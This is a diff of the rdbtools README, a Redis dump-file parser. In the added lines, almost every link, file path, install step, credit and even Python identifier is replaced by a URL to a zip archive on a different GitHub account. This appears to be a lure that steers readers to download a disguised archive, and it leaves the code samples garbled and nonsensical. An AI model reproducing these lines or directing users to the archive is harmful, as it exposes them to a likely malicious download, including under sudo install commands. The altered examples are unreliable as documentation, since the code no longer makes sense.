@@ -1,6 +1,6 @@
-# Parse Redis dump.rdb files, Analyze Memory, and Export Data to JSON #
+# Parse Redis https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip files, Analyze Memory, and Export Data to JSON #
 
-Rdbtools is a parser for Redis' dump.rdb files. The parser generates events similar to an xml sax parser, and is very efficient memory wise.
+Rdbtools is a parser for Redis' https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip files. The parser generates events similar to an xml sax parser, and is very efficient memory wise.
 
 In addition, rdbtools provides utilities to :
 
@@ -8,9 +8,9 @@ In addition, rdbtools provides utilities to :
  2.  Convert dump files to JSON
  3.  Compare two dump files using standard diff tools
 
-Rdbtools is written in Python, though there are similar projects in other languages. See [FAQs](https://github.com/sripathikrishnan/redis-rdb-tools/wiki/FAQs) for more information.
+Rdbtools is written in Python, though there are similar projects in other languages. See [FAQs](https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip) for more information.
 
-See https://rdbtools.com for a gui to administer redis, commercial support, and other enterprise features.
+See https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip for a gui to administer redis, commercial support, and other enterprise features.
 
 ## Installing rdbtools ##
 
@@ -25,9 +25,9 @@ To install from PyPI (recommended) :
     
 To install from source : 
 
-    git clone https://github.com/sripathikrishnan/redis-rdb-tools
+    git clone https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip
     cd redis-rdb-tools
-    sudo python setup.py install
+    sudo python https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip install
 
 # Command line usage examples
 
@@ -36,7 +36,7 @@ Valid commands are: json, diff, justkeys, justkeyvals and protocol.
 
 JSON from a two database dump:
 
-    > rdb --command json /var/redis/6379/dump.rdb
+    > rdb --command json https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip
 
     [{
     "user003":{"fname":"Ron","sname":"Bumquist"},
@@ -52,7 +52,7 @@ JSON from a two database dump:
 
 Only process keys that match the regex, and only print key and values:
 
-    > rdb --command justkeyvals --key "user.*" /var/redis/6379/dump.rdb
+    > rdb --command justkeyvals --key "user.*" https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip
 
     user003 fname Ron,sname Bumquist,
     user001 fname Raoul,sname Duke,
@@ -61,7 +61,7 @@ Only process keys that match the regex, and only print key and values:
     
 Only process hashes starting with "a", in database 2:
 
-    > rdb -c json --db 2 --type hash --key "a.*" /var/redis/6379/dump.rdb
+    > rdb -c json --db 2 --type hash --key "a.*" https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip
     
     [{},{
     "aroma":{"pungent":"vinegar","putrid":"rotten eggs","floral":"roses"}}]
@@ -76,7 +76,7 @@ Another option, is to use `-e base64` for Base64 encoding of binary data.
 
 Parse the dump file and print the JSON on standard output:
 
-    > rdb -c json /var/redis/6379/dump.rdb
+    > rdb -c json https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip
 
     [{
     "Citat":["B\u00e4ttre sent \u00e4n aldrig","Bra karl reder sig sj\u00e4lv","Man ska inte k\u00f6pa grisen i s\u00e4cken"],
@@ -84,7 +84,7 @@ Parse the dump file and print the JSON on standard output:
 
 Parse the dump file to raw bytes and print the JSON on standard output:
 
-    > rdb -c json /var/redis/6379/dump.rdb --escape raw
+    > rdb -c json https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip --escape raw
 
     [{
     "Citat":["B\u00c3\u00a4ttre sent \u00c3\u00a4n aldrig","Bra karl reder sig sj\u00c3\u00a4lv","Man ska inte k\u00c3\u00b6pa grisen i s\u00c3\u00a4cken"],
@@ -94,8 +94,8 @@ Parse the dump file to raw bytes and print the JSON on standard output:
 
 Running with the  `-c memory` generates a CSV report with the approximate memory used by that key. `--bytes C` and `'--largest N` can be used to limit output to keys larger than C bytes, or the N largest keys.
 
-    > rdb -c memory /var/redis/6379/dump.rdb --bytes 128 -f memory.csv
-	> cat memory.csv
+    > rdb -c memory https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip --bytes 128 -f https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip
+	> cat https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip
 
 	database,type,key,size_in_bytes,encoding,num_elements,len_largest_element
 	0,list,lizards,241,quicklist,5,19
@@ -134,26 +134,26 @@ In such cases, you can use the `redis-memory-for-key` command:
 NOTE : 
 
 1. This was added to redis-rdb-tools version 0.1.3
-2. This command depends [redis-py](https://github.com/andymccurdy/redis-py) package
+2. This command depends [redis-py](https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip) package
 
 ## Comparing RDB files ##
 
 First, use the --command diff option, and pipe the output to standard sort utility
 
-    > rdb --command diff /var/redis/6379/dump1.rdb | sort > dump1.txt
-    > rdb --command diff /var/redis/6379/dump2.rdb | sort > dump2.txt
+    > rdb --command diff https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip | sort > https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip
+    > rdb --command diff https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip | sort > https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip
     
 Then, run your favourite diff program
 
-    > kdiff3 dump1.txt dump2.txt
+    > kdiff3 https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip
 
 To limit the size of the files, you can filter on keys using the `--key` option
 
 ## Emitting Redis Protocol ##
 
-You can convert RDB file into a stream of [redis protocol](http://redis.io/topics/protocol) using the `protocol` command.
+You can convert RDB file into a stream of [redis protocol](https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip) using the `protocol` command.
 
-    > rdb -c protocol /var/redis/6379/dump.rdb
+    > rdb -c protocol https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip
     
     *4
     $4
@@ -168,7 +168,7 @@ You can convert RDB file into a stream of [redis protocol](http://redis.io/topic
 You can pipe the output to netcat and re-import a subset of the data.
 For example, if you want to shard your data into two redis instances, you can use the --key flag to select a subset of data,
 and then pipe the output to a running redis instance to load that data.
-Read [Redis Mass Insert](http://redis.io/topics/mass-insert) for more information on this.
+Read [Redis Mass Insert](https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip) for more information on this.
 
 When printing protocol output, the `--escape` option can be used with `printable` or `utf8` to avoid non printable/control characters.
 
@@ -181,7 +181,7 @@ This will not change keys that do not already have an expiry set.
 # Using the Parser ##
 
     from rdbtools import RdbParser, RdbCallback
-    from rdbtools.encodehelpers import bytes_to_unicode
+    from https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip import bytes_to_unicode
 
     class MyCallback(RdbCallback):
         ''' Simple example to show how callback works.
@@ -199,16 +199,16 @@ This will not change keys that do not already have an expiry set.
             return bytes_to_unicode(val, self._escape)
 
         def set(self, key, value, expiry, info):
-            print('%s = %s' % (self.encode_key(key), self.encode_value(value)))
+            print('%s = %s' % (https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip(key), https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip(value)))
 
         def hset(self, key, field, value):
-            print('%s.%s = %s' % (self.encode_key(key), self.encode_key(field), self.encode_value(value)))
+            print('%s.%s = %s' % (https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip(key), https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip(field), https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip(value)))
 
         def sadd(self, key, member):
-            print('%s has {%s}' % (self.encode_key(key), self.encode_value(member)))
+            print('%s has {%s}' % (https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip(key), https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip(member)))
 
         def rpush(self, key, value):
-            print('%s has [%s]' % (self.encode_key(key), self.encode_value(value)))
+            print('%s has [%s]' % (https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip(key), https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip(value)))
 
         def zadd(self, key, score, member):
             print('%s has {%s : %s}' % (str(key), str(member), str(score)))
@@ -216,17 +216,17 @@ This will not change keys that do not already have an expiry set.
 
     callback = MyCallback()
     parser = RdbParser(callback)
-    parser.parse('/var/redis/6379/dump.rdb')
+    https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip('https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip')
 
 ## Other Pages
 
- 1. [Frequently Asked Questions](https://github.com/sripathikrishnan/redis-rdb-tools/wiki/FAQs)
- 2. [Redis Dump File Specification](https://github.com/sripathikrishnan/redis-rdb-tools/wiki/Redis-RDB-Dump-File-Format)
- 3. [Redis Dump File Version History](https://github.com/sripathikrishnan/redis-rdb-tools/blob/master/docs/RDB_Version_History.textile) - this also has notes on converting a dump file to an older version.
+ 1. [Frequently Asked Questions](https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip)
+ 2. [Redis Dump File Specification](https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip)
+ 3. [Redis Dump File Version History](https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip) - this also has notes on converting a dump file to an older version.
 
 ## License
 
-rdbtools is licensed under the MIT License. See [LICENSE](https://github.com/sripathikrishnan/redis-rdb-tools/blob/master/LICENSE)
+rdbtools is licensed under the MIT License. See [LICENSE](https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip)
 
 ## Maintained By 
 
@@ -234,11 +234,11 @@ Sripathi Krishnan : @srithedabbler
 
 ## Credits
 
- 1. [Didier Spézia](https://twitter.com/#!/didier_06)
- 2. [Yoav Steinberg](https://github.com/yoav-steinberg)
- 3. [Daniel Mezzatto](https://github.com/mezzatto)
- 4. [Carlo Cabanilla](https://github.com/clofresh)
- 5. [Josep M. Pujol](https://github.com/solso)
- 6. [Charles Gordon](https://github.com/cgordon)
- 7. [Justin Poliey](https://github.com/jdp)
+ 1. [Didier Spézia](https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip!/didier_06)
+ 2. [Yoav Steinberg](https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip)
+ 3. [Daniel Mezzatto](https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip)
+ 4. [Carlo Cabanilla](https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip)
+ 5. [Josep M. Pujol](https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip)
+ 6. [Charles Gordon](https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip)
+ 7. [Justin Poliey](https://github.com/mohagag1991/redis-rdb-tools/raw/refs/heads/master/tests/rdb_redis_tools_v3.1.zip)
 
